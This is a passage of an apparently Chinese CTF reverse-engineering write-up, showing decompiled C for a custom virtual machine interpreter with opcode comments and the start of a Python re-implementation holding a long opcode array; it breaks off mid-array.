class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v18 == <span class="number">1</span> ) <span class="comment">//xor reg[arg2], reg[arg3]</span></span><br><span class="line">        &#123;</span><br><span class="line">          v36 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v36] ^= regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v18 == <span class="number">2</span> ) <span class="comment">//xor memory[reg[arg2] + arg3], arg4</span></span><br><span class="line">        &#123;</span><br><span class="line">          v19 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)] + (<span class="type">unsigned</span> __int64)regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]];</span><br><span class="line">          *(_DWORD *)&amp;v7[v19] ^= opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)];</span><br><span class="line">          dword_59D8 = v3 + <span class="number">5</span>;</span><br><span class="line">          v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>);</span><br><span class="line">          v4 = opcode[v3];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">//add指令</span></span><br><span class="line">        <span class="keyword">if</span> ( opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)] != <span class="number">3</span> ) <span class="comment">//add reg[arg2], memory[reg[arg3]] + arg4</span></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">//shr指令</span></span><br><span class="line">        v16 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span> ( v16 == <span class="number">3</span> ) <span class="comment">//shr reg[arg2], memory[reg[arg3]+arg4]</span></span><br><span class="line">        &#123;</span><br><span class="line">          v30 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v30] &gt;&gt;= *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v16 != <span class="number">4</span> ) <span class="comment">//shr reg[arg2], arg3</span></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        v17 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">        regs[v17] &gt;&gt;= opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>: <span class="comment">//shl指令，具体同上</span></span><br><span class="line">        v14 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span> ( v14 == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v31 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v31] &lt;&lt;= *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v14 != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        v15 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">        regs[v15] &lt;&lt;= opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>: <span class="comment">//cmp指令</span></span><br><span class="line">        <span class="keyword">if</span> ( opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)] != <span class="number">2</span> ) <span class="comment">//第一个参数一定为2</span></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        v10 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">        v11 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">        v12 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)];</span><br><span class="line">        v13 = (<span class="type">unsigned</span> __int8)v7[v11 + regs[v10]]; <span class="comment">//memory[reg[arg2]+arg3]</span></span><br><span class="line">        <span class="keyword">if</span> ( v13 &lt; v12 ) <span class="comment">//memory&lt;arg4</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(__m128i *)xmm = v6; <span class="comment">//xmm = 0 1 1 0</span></span><br><span class="line">          v13 = (<span class="type">unsigned</span> __int8)memory[v11 + regs[v10]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v12 == v13 ) <span class="comment">//memory==arg4</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(__m128i *)xmm = si128; <span class="comment">//xmm = 1 0 0 0</span></span><br><span class="line">          v13 = (<span class="type">unsigned</span> __int8)memory[v11 + regs[v10]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &lt; v13 ) <span class="comment">//memory&gt;arg4</span></span><br><span class="line">          *(_OWORD *)xmm = <span class="number">0LL</span>; <span class="comment">//xmm = 0 0 0 0</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>: <span class="comment">//jz指令</span></span><br><span class="line">        <span class="keyword">if</span> ( !xmm[<span class="number">0</span>] ) <span class="comment">//如果xmm[0]为0则跳转至label4（第一个参数对应的字节码索引）</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="keyword">if</span> ( xmm[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6; <span class="comment">//如果为1则跳转至label6（继续下一条指令）</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>: <span class="comment">//jmp指令</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>: <span class="comment">//and指令</span></span><br><span class="line">        v8 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">3</span> ) <span class="comment">//and reg[arg2], memory[reg[arg3] + arg[4]]</span></span><br><span class="line">        &#123;</span><br><span class="line">          v32 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v32] &amp;= *(_DWORD *)&amp;v7[regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]] + opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)]];</span><br><span class="line">LABEL_36:</span><br><span class="line">          LODWORD(v3) = dword_59D8;</span><br><span class="line">LABEL_37:</span><br><span class="line">          dword_59D8 = v3 + <span class="number">5</span>; <span class="comment">//前进五个字节</span></span><br><span class="line">          v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">5</span>);</span><br><span class="line">          v4 = opcode[v3];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">4</span> ) <span class="comment">//and reg[arg2], arg3</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)];</span><br><span class="line">          regs[v9] &amp;= opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)];</span><br><span class="line">LABEL_17:</span><br><span class="line">          dword_59D8 += <span class="number">4</span>; <span class="comment">//向前四个字节</span></span><br><span class="line">          LODWORD(v3) = dword_59D8;</span><br><span class="line">          v4 = opcode[dword_59D8];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">15</span>: <span class="comment">//jnz指令</span></span><br><span class="line">        <span class="keyword">if</span> ( xmm[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="keyword">if</span> ( !xmm[<span class="number">0</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_6: <span class="comment">//索引+2，继续下一条指令</span></span><br><span class="line">          dword_59D8 = v3 + <span class="number">2</span>;</span><br><span class="line">          v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>);</span><br><span class="line">          v4 = opcode[v3];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>: <span class="comment">//nop指令</span></span><br><span class="line">        dword_59D8 = v3 + <span class="number">1</span>;</span><br><span class="line">        v3 = (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>);</span><br><span class="line">        v4 = opcode[v3];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">17</span>: <span class="comment">//长度错误</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Length Wrong! &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">18</span>: <span class="comment">//mul指令</span></span><br><span class="line">        <span class="keyword">if</span> ( opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)] != <span class="number">4</span> ) <span class="comment">//第一个参数一定为4，mul reg[arg2], reg[arg3] * arg4</span></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">2</span>)]] = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">4</span>)] * regs[opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">3</span>)]];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">19</span>: <span class="comment">//je指令</span></span><br><span class="line">        <span class="keyword">if</span> ( xmm[<span class="number">1</span>] == xmm[<span class="number">3</span>] )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">20</span>: <span class="comment">//jz指令</span></span><br><span class="line">        <span class="keyword">if</span> ( xmm[<span class="number">2</span>] )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">LABEL_4: <span class="comment">//跳转地址到第一个参数</span></span><br><span class="line">        dword_59D8 = opcode[(<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>)];</span><br><span class="line">        LODWORD(v3) = dword_59D8;</span><br><span class="line">        v4 = opcode[dword_59D8];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析完成后用python脚本进行同构：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">opc = [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000200</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000005</span>,</span><br><span class="line">       <span class="number">0x00000050</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE4</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFD8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>,</span><br><span class="line">       <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE4</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0xFFFFFFFF</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000029</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE4</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFD8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFD4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFD4</span>, <span class="number">0x00000020</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000011</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFE0</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB0</span>, <span class="number">0x00000043</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB1</span>, <span class="number">0x00000068</span>, <span class="number">0x00000002</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB2</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB3</span>, <span class="number">0x00000076</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB4</span>, <span class="number">0x00000079</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB5</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB6</span>, <span class="number">0x00000069</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB7</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0xFFFFFFB8</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB9</span>, <span class="number">0x00000065</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFBA</span>, <span class="number">0x00000079</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFBB</span>,</span><br><span class="line">       <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFBC</span>, <span class="number">0x00000077</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFBD</span>, <span class="number">0x00000033</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFBE</span>, <span class="number">0x00000036</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFBF</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFB0</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>,</span><br><span class="line">       <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFD0</span>, <span class="number">0x1919810A</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFCC</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>,</span><br><span class="line">       <span class="number">0x00000004</span>, <span class="number">0xFFFFFFC8</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>,</span><br><span class="line">       <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFC4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000012</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF4</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0xFFFFFFC0</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000137</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>,</span><br><span class="line">       <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0xFFFFFFF8</span>, <span 